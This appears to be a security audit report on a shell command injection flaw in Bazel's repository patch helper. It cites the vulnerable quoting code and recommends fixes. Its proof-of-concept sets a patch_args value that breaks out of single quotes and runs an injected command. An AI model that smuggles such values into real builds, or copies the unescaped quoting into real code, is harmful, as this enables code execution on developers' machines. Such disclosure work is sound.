### Title
Shell Command Injection via Unescaped `patch_args`/`patch_tool` in Repository Patch Application - ([File: tools/build_defs/repo/utils.bzl])

### Summary
The generic `patch()` helper used by `http_archive`, `git_repository`, and other repository rules builds a single shell command string from the `patch_tool` and `patch_args` rule attributes and executes it via `bash -c`, wrapping each `patch_args` element in single quotes without escaping embedded single quotes. This mirrors the Termix flaw where `endpointUsername`/`endpointIP` were interpolated into a single-quoted `pkill -f` pattern: any attacker who can supply the string value that ends up in `patch_args` (or `patch_tool`) can break out of the quoting and inject arbitrary shell commands that execute during repository fetch/patch.

### Finding Description
In `patch()`, local (non-native) patch application builds a command like:
```
command = "{patchtool} {patch_args} < {patchfile}".format(
    patchtool = patch_tool,
    patchfile = ctx.path(patchfile),
    patch_args = " ".join(["'%s'" % arg for arg in patch_args]),
)
st = ctx.execute([bash_exe, "-c", command], working_directory = patch_directory or "")
``` [1](#0-0) 

Each element of `patch_args` is wrapped in `'...'` but any single quote inside the string terminates the quoted segment early, exactly as in the Termix `pkill -f 'kw:{endpointPort}...'` case. `patch_tool` is interpolated completely unquoted into the same command string. Both `patch_tool` and `patch_args` are taken directly from `ctx.attr` (i.e., from the repository rule invocation's declared attributes) when not explicitly passed by the caller: [2](#0-1) 

These attributes are part of the repository rule's own specification — for a `bazel_dep`/module fetched via Bzlmod, the archive/patch metadata (including `patch_args`, `patch_strip`, `remote_patches`) for a *dependency's* repository can originate from registry-supplied module source metadata rather than the root module's trusted BUILD/MODULE files. A malicious or compromised module/registry entry that a victim's build consumes as a transitive dependency can therefore control the `patch_args` string content that flows into this unescaped, single-quoted `bash -c` command.

The invariant broken is the same as in the Termix case: untrusted string data (an attribute value that should remain inert data) is spliced into a shell command with naive quoting that does not defend against embedded quote characters, so it stops being "data" and becomes executable shell syntax.

### Impact Explanation
If reached, this allows arbitrary command execution on the machine running `bazel build`/`bazel fetch`, with the privileges of the Bazel client process, during repository fetching — i.e., before any build sandboxing or hermetic build guarantees apply. This is a build-time RCE analogous to the Termix teardown RCE (attacker-controlled string field leads to command injection at a point where the victim expects only administrative/mechanical action, not code execution).

### Likelihood Explanation
Exploitation requires the attacker to control the value that lands in `patch_args` or `patch_tool` for a repository the victim's build fetches (e.g., a malicious third-party Bzlmod module/registry entry, or a legacy `WORKSPACE`/module extension where such attributes come from external, non-root-repo sources). This is plausible in the supply-chain sense (untrusted dependency metadata a victim's build consumes) but is somewhat narrower than the Termix case because: (1) if `patch_tool` is unset and `patch_args` contains only `-p<N>` flags, Bazel uses the native (non-shell) patch implementation, bypassing this code path entirely (`_use_native_patch`); the vulnerable path is only taken when `patch_tool` is explicitly set or `patch_args` contains anything other than `-pN`. (2) This still requires that the vulnerable string reach the repo rule's attributes from an origin outside the trusted root module.

### Recommendation
- Do not build shell command strings from `patch_tool`/`patch_args`; instead pass them as a discrete argv list to `ctx.execute` (as is already done correctly for `git` and other subprocess invocations in `git_worker.bzl`), avoiding `bash -c` string concatenation entirely.
- If a shell string must be constructed (e.g., to support redirection `< patchfile`), properly shell-escape every interpolated value (replace embedded `'` with `'\''`) rather than performing naive `'%s'` wrapping.
- Validate/reject `patch_tool`/`patch_args` values containing shell metacharacters when they can originate from non-root-repo sources (e.g., Bzlmod registry-supplied patch metadata).

### Proof of Concept
A JUnit/shell-based reproduction can extend `src/test/shell/bazel/external_patching_test.sh` (which already exercises `patch_args`/`patch_tool` via `http_archive`) as follows:
```
mkdir main
cd main
cat > $(setup_module_dot_bazel) <<EOF
http_archive = use_repo_rule("@bazel_tools//tools/build_defs/repo:http.bzl", "http_archive")
http_archive(
  name = "ext",
  urls = ["${EXTREPOURL}/ext.zip"],
  strip_prefix = "ext-0.1.2",
  patch_tool = "patch",
  patch_args = ["-p1'; touch /tmp/pwned; echo '"],
)
EOF
cat > BUILD <<'EOF'
genrule(name="local", outs=["local.txt"], srcs=["@ext//:foo.sh"], cmd="cp $< $@")
EOF
bazel build //:local
# Verify /tmp/pwned was created by the injected command executed via bash -c
test -f /tmp/pwned || fail "command injection did not execute"
```
This demonstrates that a `patch_args` value containing a single quote breaks out of the `'%s'` wrapping in `tools/build_defs/repo/utils.bzl`'s `patch()` function and executes an arbitrary injected shell command during repository fetch, matching the Termix single-quote `pkill -f` breakout pattern. [1](#0-0)

### Citations

**File:** tools/build_defs/repo/utils.bzl (L197-213)
```text
    if patch_tool == None and hasattr(ctx.attr, "patch_tool"):
        patch_tool = ctx.attr.patch_tool
    if not patch_tool:
        patch_tool = "patch"
        native_patch = True
    else:
        native_patch = False

    if patch_args == None and hasattr(ctx.attr, "patch_args"):
        patch_args = ctx.attr.patch_args
    if patch_args == None:
        patch_args = []

    if hasattr(ctx.attr, "patch_strip"):
        new_patch_args = ["-p%s" % ctx.attr.patch_strip]
        new_patch_args.extend(patch_args)
        patch_args = new_patch_args
```

**File:** tools/build_defs/repo/utils.bzl (L258-271)
```text
    else:
        for patchfile in patches:
            command = "{patchtool} {patch_args} < {patchfile}".format(
                patchtool = patch_tool,
                patchfile = ctx.path(patchfile),
                patch_args = " ".join([
                    "'%s'" % arg
                    for arg in patch_args
                ]),
            )
            st = ctx.execute([bash_exe, "-c", command], working_directory = patch_directory or "")
            if st.return_code:
                fail("Error applying patch %s:\n%s%s" %
                     (str(patchfile), st.stderr, st.stdout))
```
